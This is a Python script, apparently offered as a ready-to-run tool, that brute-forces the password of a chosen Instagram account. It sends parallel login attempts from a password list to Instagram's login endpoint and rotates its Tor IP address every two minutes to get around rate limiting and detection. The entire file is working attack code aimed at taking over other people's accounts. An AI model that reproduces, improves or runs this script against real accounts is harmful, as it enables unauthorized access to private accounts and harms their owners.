import requests
import time
import sys
from datetime import datetime
from colorama import init, Fore, Style
import threading
import socket
import concurrent.futures


# Initialize colorama
init(autoreset=True)

# Function to rotate Tor IP every 2 minutes
def rotate_tor_ip():
    while True:
        try:
            # Send the SIGNAL NEWNYM command to Tor via ControlPort (9051)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(('127.0.0.1', 9051))
                s.send(b'SIGNAL NEWNYM\n')
                time.sleep(120)  # Wait for 2 minutes before rotating the IP again
            print(Fore.CYAN + "[*] Rotating Tor IP...")

        except Exception as e:
            print(Fore.RED + f"[-] Error rotating Tor IP: {e}")
            time.sleep(120)  # Wait for 2 minutes before retrying if there's an error

def instagram_login(username, password):
    session = requests.Session()
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Use the current timestamp
    timestamp = int(datetime.now().timestamp())

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    # Start session and get the CSRF token dynamically
    try:
        session.get("https://www.instagram.com/")
        csrf_token = session.cookies['csrftoken']

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token
        }

        # Send POST request
        login_response = session.post(login_url, data=payload, headers=headers)
        login_response.raise_for_status()  # Raise an error for bad responses

        response_data = login_response.json()

        # Check for successful login
        if response_data.get('authenticated', False):
            return True
        else:
            return False

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Request error: {e}")
        return False
    except KeyError:
        print(Fore.RED + "[-] Failed to retrieve CSRF token")
        return False
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")
        return False

def main():
    username = input("Enter Instagram username to bruteforce: ")
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
    print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")

    # Start Tor IP rotation in the background
    rotation_thread = threading.Thread(target=rotate_tor_ip)
    rotation_thread.daemon = True  # Daemonize the thread so it ends with the main process
    rotation_thread.start()

    # Use ThreadPoolExecutor for parallel password attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(instagram_login, username, password) for password in passwords]

        for future in concurrent.futures.as_completed(futures):
            if future.result():  # If login is successful
                print(Fore.GREEN + f"[+] Login successful!")
                break
            else:
                print(Fore.RED + f"Status = [Fail]")

    print(Fore.GREEN + "[*] Bruteforce attack completed.")

if __name__ == "__main__":
    main() 
